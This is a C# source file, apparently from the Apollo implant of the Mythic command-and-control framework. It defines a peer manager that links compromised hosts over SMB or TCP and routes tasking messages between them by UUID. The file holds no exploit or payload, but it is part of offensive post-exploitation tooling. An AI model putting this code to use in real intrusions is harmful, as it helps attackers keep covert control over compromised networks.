using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Apollo.Peers.SMB;
using Apollo.Peers.TCP;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using AI = ApolloInterop;
namespace Apollo.Management.Peer
{
    public class PeerManager : AI.Classes.PeerManager
    {
        public PeerManager(IAgent agent) : base(agent)
        {

        }

        public override IPeer AddPeer(PeerInformation connectionInfo)
        {
            IPeer peer = null;
            switch(connectionInfo.C2Profile.Name.ToUpper())
            {
                case "SMB":
                    peer = new SMBPeer(_agent, connectionInfo);
                    break;
                case "TCP":
                    peer = new TCPPeer(_agent, connectionInfo);
                    break;
                default:
                    throw new Exception("Not implemented.");
            }
            if (peer == null)
            {
                throw new Exception("Peer not set to an instance of an object.");
            }
            peer.Start();
            while (!_peers.TryAdd(peer.GetUUID(), peer))
            {
                System.Threading.Thread.Sleep(100);
            }
            return peer;
        }

        public override bool Route(DelegateMessage msg)
        {
            if (msg.MythicUUID != null &&
                msg.UUID != msg.MythicUUID)
            {
                lock(_peers)
                {
                    _peers.TryRemove(msg.UUID, out IPeer p);
                    _peers[msg.MythicUUID] = p;
                }
                msg.UUID = msg.MythicUUID;
            }
            if (_peers.ContainsKey(msg.UUID))
            {
                _peers[msg.UUID].ProcessMessage(msg);
                return true;
            }
            return false;
        }
    }
}
